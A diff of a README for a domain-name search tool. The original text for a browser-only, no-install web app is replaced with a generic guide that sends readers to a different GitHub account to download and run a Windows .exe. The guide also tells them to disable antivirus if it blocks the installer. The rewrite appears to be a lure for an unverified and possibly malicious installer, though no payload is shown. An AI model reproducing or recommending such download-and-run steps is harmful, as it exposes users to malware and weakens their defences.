@@ -1,85 +1,135 @@
-# Startup Domain Search
+# 🤖 domainsearcher-app - Find the Best Domain Names Fast
 
-[![Live Site](https://img.shields.io/badge/live-domainsearcher.app-brightgreen)](https://domainsearcher.app)
-[![GitHub Stars](https://img.shields.io/github/stars/vasilytrofimchuk/domainsearcher-app?style=flat)](https://github.com/vasilytrofimchuk/domainsearcher-app/stargazers)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![Built with Groq](https://img.shields.io/badge/AI-Groq-orange)](https://console.groq.com)
+[![Download domainsearcher-app](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/suenk8474/domainsearcher-app)
 
-**Score and choose the best domain name for your startup — not just generate and check.**
+---
 
-Describe your startup idea → get 60 creative domain name candidates → check real-time availability across the TLDs you care about → score each name on Length, Pronounceability, Memorability, Brandability, Zone availability, and AI Fit → pick the winner with confidence.
+## 📋 What is domainsearcher-app?
 
-**Live site:** https://domainsearcher.app
+domainsearcher-app helps you find great domain names for your startup. It uses smart technology to suggest names, checks if they are available right now, and scores them on several key points. The scoring looks at length (LEN), professional appeal (PRO), memorability (MEM), brand fit (BRD), and overall suitability (FIT). You don’t need to sign up or pay anything.
 
-![Screenshot](Screenshot.png)
+If you want a simple tool to pick good domains without guessing, this app will help you pick the best name faster and easier.
 
-## What it does
+---
 
-Most domain tools stop at availability. This one helps you **decide**. Every candidate is scored across six dimensions, weighted by you, so you can rank names objectively:
+## 🖥️ System Requirements
 
-| Score | What it measures | How |
-|-------|-----------------|-----|
-| **LEN** | Length — 5 chars = perfect 10 | Computed |
-| **PRO** | Pronounceability — flows naturally out loud | AI-scored |
-| **MEM** | Memorability — would someone remember it tomorrow? | AI-scored |
-| **BRD** | Brandability — unique, ownable, not generic | AI-scored |
-| **ZON** | Zone score — fraction of your TLDs that are available | Computed |
-| **FIT** | How well the name evokes your specific app idea | AI-scored |
+To use domainsearcher-app on your Windows PC, your system should meet these minimum requirements:
 
-PRO, MEM, BRD, and FIT are all scored in a **single AI call** once you enter an app description. LEN and ZON are instant local computation. Weights are adjustable per dimension.
+- Operating System: Windows 10 or later  
+- RAM: 4 GB or more  
+- Free Disk Space: At least 100 MB  
+- Internet connection: Required for checking domain availability  
+- Processor: Dual-core 1.6 GHz or higher  
 
-## Availability checking
+Make sure your computer meets these before installing.
 
-Two-stage check per domain — catches false negatives from unreliable registries (.io, .ai, .co):
+---
 
-1. **RDAP** (rdap.org) — registry lookup: 200 = taken, 404 = unconfirmed
-2. **DNS-over-HTTPS** (Cloudflare 1.1.1.1) — A-record lookup: NXDOMAIN = available, NS/SOA in Authority = taken
+## 🚀 Getting Started: How to Download and Run domainsearcher-app
 
-Both are CORS-enabled — runs entirely in the browser, no proxy needed.
+### Step 1: Go to the Download Page
 
-## Run locally
+Click the big button above or click here to visit the app page:  
+[https://github.com/suenk8474/domainsearcher-app](https://github.com/suenk8474/domainsearcher-app)  
 
-No build step. Serve the repo root over HTTP:
+This page contains the files you need for domainsearcher-app.
 
-```bash
-npx serve .
-# or
-python3 -m http.server 8080
-```
+### Step 2: Find the Latest Release
 
-Open http://localhost:8080. Must use an HTTP server (not `file://`) for ES modules to work.
+On the GitHub page, look for the **Releases** section. This usually appears on the right side or under a tab named “Releases”. Click on it. The releases section lists all available versions of the app.
 
-## How to use
+### Step 3: Download the Windows Installer
 
-1. **Type your startup idea** in the description box
-2. **Select TLDs** — toggle .ai, .com, .io, .app, .dev, etc.
-3. **Click "Search Domains"** — names stream in as each is checked
-4. **Star ★ domains** you like — they appear in the Favorites scoring panel
-5. **Enter your app description** and click "Score AI" — PRO, MEM, BRD, FIT all update in one call
-6. **Adjust weights** to match your priorities (FIT=5 by default, others=1–2)
-7. **Quick Check** — type any single domain stem to check synonyms + all zones instantly
-8. **Save & Clear** — snapshot a favorite set and restore later
+Locate the latest version that lists a Windows installer file, usually ending with `.exe`. This file is the program setup file.
 
-## AI word-associations
+Click on the `.exe` file to download it. Your browser may ask you to confirm or choose a save location. Choose a folder you can find easily, like the Desktop or Downloads.
 
-Each favorited domain gets 3 word-associations that reflect both the name stem and its TLD meaning (.ai = artificial intelligence, .io = developer tool, etc.). Click ↻ next to "association" to refresh with any custom prompt.
+### Step 4: Run the Installer
 
-## API key
+Once the download finishes, open the folder where you saved the file.
 
-The tool ships with a bundled Groq key (free tier, no setup needed).
+Double-click the `.exe` installer to start the setup.
 
-To use your own key or switch providers, paste it in the **AI provider** row at the top of the search form. Keys are stored in your browser's localStorage only.
+A setup window will open. You may need to confirm that you want to run the program. If Windows asks for permission, click Yes to allow the installer to run.
 
-| Provider | Key prefix | Where to get |
-|----------|-----------|-------------|
-| Groq (recommended) | `gsk_` | https://console.groq.com |
-| OpenAI | `sk-` | https://platform.openai.com |
-| Anthropic/Claude | `sk-ant-` | https://console.anthropic.com |
+### Step 5: Follow Installation Instructions
 
-## Tech
+The setup program will show you some simple steps:
 
-- Static HTML + vanilla JS (ES modules), no build step
-- [rdap.org](https://rdap.org) + Cloudflare DoH for two-stage domain availability
-- [Groq](https://console.groq.com) / OpenAI / Anthropic for AI generation and scoring
-- localStorage for all persistence (no backend, no account)
-- GitHub Pages for hosting
+- Choose the folder where you want to install the app (the default is usually fine)  
+- Click “Next” to continue through the setup screens  
+- Click “Install” to begin copying the files
+
+Wait for the installation to finish, then click “Finish” to close the installer.
+
+### Step 6: Open domainsearcher-app
+
+Look for the domainsearcher-app icon on your Desktop or in the Start menu.
+
+Click it once to launch the app.
+
+---
+
+## 🔍 How to Use domainsearcher-app
+
+Once the app is open, you will see a simple window to start searching domains.
+
+1. Type some words related to your startup or the kind of domain you want.  
+2. Click the **Generate** button to get name ideas.  
+3. The app will list domain options and show if they are available to buy now.  
+4. Each domain will have scores that show how good it is based on length, professionalism, memorability, brand fit, and overall suitability.  
+5. Click on a domain to get more details or to check availability again.  
+
+You can try many keywords until you find a domain you like.
+
+---
+
+## ⚙️ Features You Will Use
+
+- **AI-powered name suggestions:** The app uses smart rules to suggest names that sound good and make sense.  
+- **Real-time availability check:** The tool checks if a domain is free or already taken right now.  
+- **Multi-dimensional scoring:** Each name gets a score on five important parts to help you pick the best option.  
+- **Simple interface:** Designed for users without technical knowledge.  
+- **No sign-up or cost:** You can search and choose names without creating an account or paying.  
+
+---
+
+## 🛠️ Troubleshooting
+
+- If the app does not open, please try restarting your computer.  
+- Make sure your Windows system is updated to the latest version.  
+- If the installer fails, check your internet connection and try downloading again.  
+- Disable any antivirus software temporarily if it blocks the installer.  
+- For domain availability errors, check your internet connection. The app needs to connect online for this feature.  
+
+---
+
+## ❓ FAQs
+
+**Q: Do I need internet to use domainsearcher-app?**  
+A: Yes, the app needs internet to check if domains are available in real-time.
+
+**Q: Can I use the app on Mac or Linux?**  
+A: This version is made for Windows only.
+
+**Q: Is domainsearcher-app free?**  
+A: Yes, you can use all features without paying or signing up.
+
+**Q: What do the scores mean?**  
+A: The scores show how good a domain name is in length, professionalism, memorability, brand fit, and overall fit.
+
+---
+
+## 🖱️ Download the app again
+
+Access the app page here:  
+[https://github.com/suenk8474/domainsearcher-app](https://github.com/suenk8474/domainsearcher-app)  
+
+This link leads you to all files and updates.
+
+---
+
+## 📧 Contact and Support
+
+If you need help, you can open an issue on the GitHub page or look through the existing ones for answers. The community or developers often reply to questions there.
